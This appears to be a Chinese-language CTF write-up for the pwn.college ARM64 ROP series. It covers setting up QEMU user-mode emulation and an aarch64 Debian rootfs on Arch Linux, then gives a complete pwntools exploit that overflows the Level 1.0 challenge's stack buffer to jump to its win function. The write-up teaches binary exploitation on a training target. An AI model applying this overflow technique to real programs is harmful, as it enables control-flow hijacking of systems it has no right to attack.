---
title: "Write-ups: ARM Architecture (ARM64 ROP) series"
published: 2026-01-11
updated: 2026-01-11
description: "Write-ups for pwn.college binary exploitation series."
image: ""
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# 工欲善其事，必先利其器

## Speedrun 异架构汇编

直接看我[笔记](/posts/cs-notes/cross-isas/)就好了，虽然不是很详细，后面有时间的话我会再多写点的<i>/画大饼，很大很大的饼（bushi</i>

## 异架构环境搭建

由于我使用的是 Arch Linux，所以这里的搭建步骤都按照 Arch 的用法来写，不过实际上其它发行版的大致流程也大差不差的。

```shellsession
paru -S qemu-user-static qemu-user-static-binfmt
```

确保 `binfmt` 安装成功：

```shellsession
ls /proc/sys/fs/binfmt_misc/qemu-aarch64
```

创建 `aarch64-rootfs`:

```shellsession
paru -S debootstrap
sudo debootstrap --arch=arm64 bookworm /opt/aarch64-rootfs http://deb.debian.org/debian
sudo chroot /opt/aarch64-rootfs /bin/bash
uname -m # should result aarch64
apt update
apt install -y libcapstone4 # just install needed packages, for dynamically linked programs
exit
```

:::important
上面这个创建 `aarch64-rootfs` 然后安装软件包是为了解决非静态链接的异架构 ELF 文件无法运行的问题，至于具体安装什么软件包，也是取决于那个动态连接的文件用到了什么包，`libcapstone4` 只是举个例子，需要根据实际情况来判断。

如果给的是静态链接的 ELF 文件，则一般可以直接使用 `qemu-aarch64-static ./file` 来运行。

简单介绍一下 `qemu-user` 和 `qemu-user-static` 之间的区别，其实就是 `qemu` 本身是否静态链接。静态链接版本的会提供一些最基本的库，动态链接版本的则完全没有，就那么简单，所以一般使用 `static` 版本即可。

至于 `binfmt` 的作用，可以简单理解为隐藏了手动确认架构信息这些步骤，自动识别架构。这里我完全是为了图方便，因为手动设置架构的时候 `chroot` 没成功，改用 `binfmt` 就一次过了，太懒了，没深入研究哈哈哈，这种东西能跑就行<i>/逃</i>
:::

# Level 1.0

## Information

- Category: Pwn

## Description

> The goal of this level is quite simple: redirect control flow to the win function.

## Write-up

经典栈溢出 plus 后门。

## Exploit

```python
#!/usr/bin/env python3

import argparse

from pwn import (
    ELF,
    context,
    flat,
    gdb,
    process,
    raw_input,
    remote,
)

parser = argparse.ArgumentParser()
parser.add_argument("-L", "--local", action="store_true", help="Run locally")
parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
args = parser.parse_args()


FILE = "/challenge/level-1-0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = elf.libc


def mangle(pos, ptr, shifted=1):
    if shifted:
        return pos ^ ptr
    return (pos >> 12) ^ ptr


def demangle(pos, ptr, shifted=1):
    if shifted:
        return mangle(pos, ptr)
    return mangle(pos, ptr, 0)


def launch(argv=None, envp=None):
    global target, thread

    if argv is None:
        argv = [FILE]

    if args.local and args.threads is not None:
        raise ValueError("Options -L and -T cannot be used together.")

    if args.local:
        if args.gdb and "qemu" in argv[0]:
            if "-g" not in argv:
                argv.insert(1, str(args.port))
                argv.insert(1, "-g")
        target = process(argv, env=envp)
    elif args.threads:
        if args.threads <= 0:
            raise ValueError("Thread count must be positive.")
        process(FILE)

        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
    else:
        target = remote(HOST, PORT, ssl=True)


def main():
    # launch(["qemu-aarch64-static", "-L", "/opt/aarch64-rootfs", FILE])
    target = process(["/challenge/run"])

    payload = flat(
        {
            0x7C: elf.sym["win"],
        },
        filler=b"\x00",
    )
    raw_input("DEBUG")
    target.send(payload)

    target.interactive()


if __name__ == "__main__":
    main()
```
